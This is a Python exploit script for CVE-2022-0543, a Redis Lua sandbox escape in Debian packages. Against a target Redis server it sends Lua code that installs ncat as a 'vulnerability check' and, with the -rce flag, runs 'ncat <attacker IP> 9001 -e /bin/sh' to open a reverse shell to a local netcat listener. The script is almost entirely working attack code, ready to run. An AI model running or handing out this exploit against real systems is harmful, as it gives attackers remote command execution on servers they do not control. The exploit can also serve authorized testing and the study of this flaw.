#! /usr/bin/python3
# CVE-2022-0543
# Redis Remote Code Execution
# version : Redis 5:5.0.14-1+deb10u2 , Redis 5:6.0.16-1+deb11u2 , Redis 5:7.0.15-1~deb12u1
# version(reg) : ^(6\.0\.16|5\.0\.14|7\.0(\.0)?)$

import redis
import argparse
import subprocess
import time
from urllib.parse import urlparse
import socket, sys, time
from threading import Thread
import base64
import os

parser = argparse.ArgumentParser(usage="python CVE-2022-0543.py -u <Target URL> -rce")
parser.add_argument('--URL', '-u', required=True, help='Target Redis HOST')
parser.add_argument("-rce","--RCE", required=False, help='remote code execution mode', action='store_true')
args = parser.parse_args()

print('''==============================\n        CVE-2022-0543\n Redis Remoce Code Execution\n==============================''')


def nc_listener():
    os.system("nc -lnvp 9001")


def Get_My_IP():
    result = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
    ip = result.stdout.strip().split()[0]
    return ip


def redis_connect(host):
    try:
        r = redis.Redis(host=host, socket_connect_timeout=2)
        print(f"[+] Successfully connected to Redis server at {host}")

    except redis.exceptions.ConnectionError:
        print(f"[-] Failed to connect to Redis server at {host}")
        exit(1)


def Detected_Vulnerability(host):
    #취약점 확인 겸 ncat을 설치합니다.
    lua_script = f'''
    local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
    local io = io_l();
    local f = io.popen("apt install ncat", "r");
    local res = f:read("*a");
    f:close();
    return res
    '''
    r = redis.Redis(host=host)

    try:
        result = r.eval(lua_script, 0)
        # print("ncat download :",result)
        print(f"[*] Detected Vulnerability : True")
        print("----------------------------------")
        return True
    except Exception as e:
        print(f"[-] Detected Vulnerability : False")
        return False


def exploit(host):
    listener_thread = Thread(target=nc_listener)
    listener_thread.start()
    time.sleep(1)

    attacker_IP = Get_My_IP()

    #PoC
    lua_script = f'''
    local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
    local io = io_l();
    local f = io.popen("ncat {attacker_IP} 9001 -e /bin/sh", "r");
    local res = f:read("*a");
    f:close();
    return res
    '''
    r = redis.Redis(host=host)

    try:
        print(f"[+] {host} - Remote Code Execution Successful\n")
        result = r.eval(lua_script, 0)
        print(result)
        
    except Exception as e:
        print(f"[-] Remote Code Execution failed: {str(e)}")


if __name__ == "__main__":
    
    #https://127.0.0.1:80에서 127.0.0.1만 분리
    host = urlparse(args.URL).hostname

    print(f"[+] Target URL: {host}")
    redis_connect(host)

    if Detected_Vulnerability(host):

        if args.RCE:
            exploit(host)
        else:
            print("To execute an RCE, add the -rce option.")